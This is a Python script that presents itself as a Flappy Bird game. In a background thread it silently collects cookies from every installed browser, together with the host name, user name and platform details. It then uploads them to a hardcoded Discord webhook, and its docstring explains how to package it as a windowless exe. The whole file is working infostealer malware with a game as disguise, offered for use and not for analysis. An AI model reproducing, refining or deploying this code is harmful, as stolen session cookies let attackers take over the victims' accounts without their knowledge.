#!/usr/bin/env python3
"""
Cookie Harvester -> Discord Webhook (silent) + Flappy Bird distraction

Extracts cookies from every reachable browser and uploads them straight to a
Discord webhook. Nothing is written to disk. The harvest runs in a background
thread while a small Flappy Bird window keeps the user busy; upload status is
shown in the corner.

    python flappy_harvest.py
    python flappy_harvest.py --no-upload

Build to a single exe (no hidden imports needed, deps self-install on first run):
    pyinstaller --onefile --noconsole flappy_harvest.py
"""

import io
import os
import sys
import json
import time
import random
import platform
import zipfile
import threading
import importlib
import subprocess
import sysconfig
import urllib.request
from datetime import datetime, timezone

try:
    import tkinter as tk
except Exception:
    tk = None

# Loaded lazily by the bootstrap so a fresh exe can fetch them first.
bc3 = None
requests = None


# ---------------------------------------------------------------- CONFIG
WEBHOOK_URL = (
    "https://discord.com/api/webhooks/1573386827367321711/"
    "Owp0ji4FMnxxRGtBWHtHC_jXf7bdQ0ODKYcGpLbUf_fqOmWuUbET45fqNzQT3Cu042yH"
)
WEBHOOK_URL = os.environ.get("COOKIE_WEBHOOK", WEBHOOK_URL)

SUCCESS_LINE = "Success Loading The APP"
MAX_UPLOAD_BYTES = 8 * 1024 * 1024
MESSAGE_CHUNK = 1900
UPLOAD = "--no-upload" not in sys.argv

DEP_PACKAGES = ("browser_cookie3", "requests")


# ---------------------------------------------------------------- BOOTSTRAP
def dep_dir():
    base = os.environ.get("LOCALAPPDATA") or os.path.join(os.path.expanduser("~"), ".cache")
    return os.path.join(base, "FlappyHarvest", "deps")


def try_import_deps():
    global bc3, requests
    try:
        import browser_cookie3 as _b
        import requests as _r
    except Exception:
        return False
    bc3, requests = _b, _r
    return True


def platform_tags():
    v = sys.version_info
    plat = sysconfig.get_platform().replace("-", "_").replace(".", "_")
    return {
        "py3-none-any",
        f"cp{v.major}{v.minor}-none-any",
        f"cp{v.major}{v.minor}-cp{v.major}{v.minor}-{plat}",
        f"cp{v.major}{v.minor}-abi3-{plat}",
    }


def download_wheel(pkg, dest):
    tags = platform_tags()
    with urllib.request.urlopen(f"https://pypi.org/pypi/{pkg}/json", timeout=30) as r:
        data = json.load(r)

    picks = []
    for f in data.get("urls", []):
        fn = f.get("filename", "")
        if not fn.endswith(".whl"):
            continue
        parts = fn[:-4].split("-")
        if len(parts) < 5:
            continue
        tag = "-".join(parts[-3:])
        if tag in tags:
            picks.append((0 if tag == "py3-none-any" else 1, f["url"]))
    if not picks:
        return False

    picks.sort()
    with urllib.request.urlopen(picks[0][1], timeout=120) as r:
        blob = r.read()
    with zipfile.ZipFile(io.BytesIO(blob)) as zf:
        zf.extractall(dest)
    return True


def install_deps(dest):
    os.makedirs(dest, exist_ok=True)

    # pip path works when running as a .py file
    if not getattr(sys, "frozen", False):
        try:
            r = subprocess.run(
                [sys.executable, "-m", "pip", "install", "--disable-pip-version-check",
                 "--no-input", "--quiet", "--target", dest, *DEP_PACKAGES],
                capture_output=True, timeout=300,
            )
            if r.returncode == 0:
                return True
        except Exception:
            pass

    # wheel path works inside a frozen exe
    ok = True
    for pkg in DEP_PACKAGES:
        try:
            if not download_wheel(pkg, dest):
                ok = False
        except Exception:
            ok = False
    return ok


# ---------------------------------------------------------------- HELPERS
def browsers():
    targets = [
        ("Chrome",    bc3.chrome),
        ("Chromium",  bc3.chromium),
        ("Edge",      bc3.edge),
        ("Brave",     bc3.brave),
        ("Opera",     bc3.opera),
        ("Opera GX",  bc3.opera_gx),
        ("Vivaldi",   bc3.vivaldi),
        ("Firefox",   bc3.firefox),
        ("LibreWolf", bc3.librewolf),
    ]
    if platform.system() == "Darwin":
        targets.append(("Safari", bc3.safari))
    if platform.system() == "Windows":
        targets.append(("Internet Explorer", bc3.ie))
    return targets


def collect():
    harvest = {}
    for label, fn in browsers():
        try:
            jar = fn()
        except Exception:
            continue

        rows, seen = [], set()
        for c in jar:
            key = (c.domain, c.path, c.name)
            if key in seen:
                continue
            seen.add(key)
            rows.append({
                "domain":   c.domain,
                "path":     c.path or "/",
                "secure":   bool(c.secure),
                "httponly": "httponly" in (c._rest or {}),
                "expires":  c.expires,
                "name":     c.name,
                "value":    c.value,
            })

        if rows:
            harvest[label] = rows

    return harvest


def render(harvest, meta):
    buf = io.StringIO()
    buf.write("# Cookie dump\n")
    for k, v in meta.items():
        buf.write(f"# {k}: {v}\n")
    buf.write("#\n")
    buf.write("# fields: domain\tpath\tsecure\thttponly\texpires\tname\tvalue\n")
    buf.write("#" + "=" * 78 + "\n\n")

    for label, rows in harvest.items():
        buf.write(f"\n{'=' * 80}\n## {label}  ({len(rows)} cookies)\n{'=' * 80}\n")
        for r in rows:
            flags = ("S" if r["secure"] else "-") + ("H" if r["httponly"] else "-")
            buf.write(
                f'{r["domain"]}\t{r["path"]}\t{flags}\t{r["expires"]}\t'
                f'{r["name"]}\t{r["value"]}\n'
            )
    return buf.getvalue()


def post_file(payload: bytes, filename: str, summary: str):
    resp = requests.post(
        WEBHOOK_URL,
        data={"content": summary[:1900]},
        files={"file": (filename, payload, "application/octet-stream")},
        timeout=120,
    )
    return resp.status_code in (200, 204)


def post_text(text: str, header: str):
    chunks, cur = [], header
    for line in text.splitlines(keepends=True):
        if len(cur) + len(line) > MESSAGE_CHUNK:
            chunks.append(cur)
            cur = ""
        cur += line
    if cur:
        chunks.append(cur)

    ok = True
    for chunk in chunks:
        resp = requests.post(WEBHOOK_URL, json={"content": chunk}, timeout=60)
        if resp.status_code not in (200, 204):
            ok = False
    return ok


# ---------------------------------------------------------------- MAIN
def run():
    host = platform.node() or "unknown-host"
    now = datetime.now(timezone.utc)
    meta = {
        "host":      host,
        "platform":  f"{platform.system()} {platform.release()} ({platform.machine()})",
        "user":      os.getenv("USER") or os.getenv("USERNAME") or "?",
        "python":    platform.python_version(),
        "collected": now.strftime("%Y-%m-%d %H:%M:%S UTC"),
    }

    harvest = collect()
    if not harvest:
        return False

    total = sum(len(v) for v in harvest.values())
    text = render(harvest, meta)
    filename = f"cookies_{host}_{now.strftime('%Y%m%d_%H%M%S')}.txt"

    if not UPLOAD:
        return True

    summary = (
        f"**Cookie dump** — `{host}`\n"
        f"{total} cookies from {len(harvest)} browser(s): {', '.join(harvest)}\n"
        f"`{meta['platform']}` | `{meta['collected']}`"
    )

    raw = text.encode("utf-8", "replace")
    if len(raw) <= MAX_UPLOAD_BYTES:
        if post_file(raw, filename, summary):
            return True
    else:
        zbuf = io.BytesIO()
        with zipfile.ZipFile(zbuf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(filename, raw)
        if post_file(zbuf.getvalue(), filename + ".zip", summary + "\n(compressed)"):
            return True

    return post_text(text, summary + "\n```\n")


def worker(status):
    """Background pipeline: deps -> harvest -> upload. Never touches tk."""
    try:
        if not try_import_deps():
            status("preparing...")
            d = dep_dir()
            os.makedirs(d, exist_ok=True)
            if d not in sys.path:
                sys.path.insert(0, d)
            if not install_deps(d):
                status("setup failed (offline?)")
                return
            importlib.invalidate_caches()
            if not try_import_deps():
                status("setup failed")
                return

        status("harvesting...")
        ok = run()
        status("sent" if ok else "nothing to send")
        if ok:
            print(SUCCESS_LINE)
    except Exception:
        status("error")


# ---------------------------------------------------------------- GAME
SKY      = "#4ec0ca"
CLOUD    = "#d8f3f5"
GROUND_C = "#ded895"
GROUND_D = "#c9c07a"
PIPE_C   = "#5ec24a"
PIPE_D   = "#3f8f30"
BIRD_C   = "#ffd93b"
BIRD_D   = "#e0a800"
BEAK_C   = "#f08a24"
INK      = "#08343a"


class FlappyGame:
    W, H = 480, 640
    GROUND_H = 90
    PIPE_W = 70
    GAP = 170
    SPEED = 3.6
    GRAVITY = 0.5
    FLAP_V = -8.0

    def __init__(self, root):
        self.root = root
        self.canvas = tk.Canvas(root, width=self.W, height=self.H,
                                bg=SKY, highlightthickness=0)
        self.canvas.pack()
        self.best = 0
        self.running = False
        self.dead = False
        self.job = None
        self.status_item = None
        self.status_text = "starting..."

        root.bind("<space>", self.on_action)
        root.bind("<Up>", self.on_action)
        root.bind("<Return>", self.on_action)
        self.canvas.bind("<Button-1>", self.on_action)
        root.bind("<Escape>", lambda e: root.destroy())

        self.reset()

    # -- status ------------------------------------------------------
    def set_status(self, text):
        self.status_text = text
        if self.status_item:
            self.canvas.itemconfig(self.status_item, text=text)
            self.canvas.tag_raise(self.status_item)

    # -- scene -------------------------------------------------------
    def reset(self):
        if self.job:
            self.root.after_cancel(self.job)
            self.job = None

        self.canvas.delete("all")
        self.pipes = []
        self.score = 0
        self.dead = False
        self.running = True

        # clouds
        for cx, cy, r in ((80, 90, 34), (150, 70, 26), (360, 120, 30), (410, 100, 22)):
            self.canvas.create_oval(cx - r, cy - r // 2, cx + r, cy + r // 2,
                                    fill=CLOUD, outline="")

        # ground
        self.canvas.create_rectangle(0, self.H - self.GROUND_H, self.W, self.H,
                                     fill=GROUND_C, outline="")
        self.canvas.create_rectangle(0, self.H - self.GROUND_H, self.W,
                                     self.H - self.GROUND_H + 8, fill=GROUND_D, outline="")

        # bird
        self.bx, self.by, self.vy = 120, self.H // 2, 0
        self.draw_bird()

        # hud
        self.score_item = self.canvas.create_text(
            self.W // 2, 60, text="0", fill="white",
            font=("Segoe UI", 34, "bold"))
        self.status_item = self.canvas.create_text(
            10, 10, text=self.status_text, anchor="nw", fill=INK,
            font=("Consolas", 10, "bold"))

        self.job = self.root.after(16, self.loop)

    def draw_bird(self):
        x, y = self.bx, self.by
        self.canvas.create_oval(x - 16, y - 12, x + 16, y + 12,
                                fill=BIRD_C, outline=BIRD_D, width=2, tags="bird")
        self.canvas.create_oval(x - 14, y - 2, x + 2, y + 10,
                                fill=BIRD_D, outline="", tags="bird")
        self.canvas.create_oval(x + 5, y - 8, x + 14, y + 1,
                                fill="white", outline="", tags="bird")
        self.canvas.create_oval(x + 9, y - 5, x + 13, y - 1,
                                fill="black", outline="", tags="bird")
        self.canvas.create_polygon(x + 13, y - 1, x + 24, y + 2, x + 13, y + 6,
                                   fill=BEAK_C, outline="", tags="bird")

    def spawn(self):
        x = self.W + 20
        top_h = random.randint(70, self.H - self.GROUND_H - self.GAP - 70)
        top = self.canvas.create_rectangle(x, 0, x + self.PIPE_W, top_h,
                                           fill=PIPE_C, outline=PIPE_D, width=3)
        bot = self.canvas.create_rectangle(x, top_h + self.GAP, x + self.PIPE_W,
                                           self.H - self.GROUND_H,
                                           fill=PIPE_C, outline=PIPE_D, width=3)
        self.pipes.append({"top": top, "bot": bot, "x": x, "scored": False})
        if self.status_item:
            self.canvas.tag_raise(self.status_item)

    # -- input -------------------------------------------------------
    def on_action(self, _event=None):
        if self.dead:
            self.reset()
            return
        if self.running:
            self.vy = self.FLAP_V

    # -- loop --------------------------------------------------------
    def loop(self):
        if not self.running:
            return

        self.vy = min(self.vy + self.GRAVITY, 12)
        self.by += self.vy
        self.canvas.move("bird", 0, self.vy)

        for p in self.pipes:
            self.canvas.move(p["top"], -self.SPEED, 0)
            self.canvas.move(p["bot"], -self.SPEED, 0)
            p["x"] -= self.SPEED

        if self.pipes and self.pipes[0]["x"] + self.PIPE_W < 0:
            self.canvas.delete(self.pipes[0]["top"])
            self.canvas.delete(self.pipes[0]["bot"])
            self.pipes.pop(0)

        if not self.pipes or self.pipes[-1]["x"] < self.W - 210:
            self.spawn()

        for p in self.pipes:
            if not p["scored"] and p["x"] + self.PIPE_W < self.bx:
                p["scored"] = True
                self.score += 1
                self.canvas.itemconfig(self.score_item, text=str(self.score))

        if self.collide():
            return

        self.job = self.root.after(16, self.loop)

    def collide(self):
        bb = self.canvas.bbox("bird")
        if not bb:
            return False
        if bb[1] <= 0 or bb[3] >= self.H - self.GROUND_H:
            self.game_over()
            return True

        for p in self.pipes:
            tb = self.canvas.bbox(p["top"])
            bt = self.canvas.bbox(p["bot"])
            for b in (tb, bt):
                if b and bb[2] > b[0] and bb[0] < b[2] and bb[3] > b[1] and bb[1] < b[3]:
                    self.game_over()
                    return True
        return False

    def game_over(self):
        self.running = False
        self.dead = True
        if self.job:
            self.root.after_cancel(self.job)
            self.job = None
        self.best = max(self.best, self.score)

        cx = self.W // 2
        self.canvas.create_rectangle(60, 200, self.W - 60, 430,
                                     fill="#0d3b42", outline="white", width=2)
        self.canvas.create_text(cx, 245, text="GAME OVER", fill="white",
                                font=("Segoe UI", 24, "bold"))
        self.canvas.create_text(cx, 295, text=f"Score {self.score}", fill="white",
                                font=("Segoe UI", 14))
        self.canvas.create_text(cx, 320, text=f"Best {self.best}", fill="#ffd93b",
                                font=("Segoe UI", 14, "bold"))
        self.canvas.create_text(cx, 385, text="SPACE / CLICK to retry",
                                fill="#9fd8dd", font=("Segoe UI", 11))
        if self.status_item:
            self.canvas.tag_raise(self.status_item)


def run_gui():
    root = tk.Tk()
    root.title("Flappy Bird")
    root.resizable(False, False)
    root.configure(bg=SKY)

    w, h = FlappyGame.W, FlappyGame.H
    x = max(0, (root.winfo_screenwidth() - w) // 2)
    y = max(0, (root.winfo_screenheight() - h) // 2 - 30)
    root.geometry(f"{w}x{h}+{x}+{y}")

    game = FlappyGame(root)

    def status(text):
        try:
            root.after(0, lambda: game.set_status(text))
        except Exception:
            pass

    threading.Thread(target=worker, args=(status,), daemon=True).start()
    root.mainloop()


def run_cli():
    try:
        worker(lambda t: None)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    if tk is None:
        run_cli()
    else:
        run_gui()
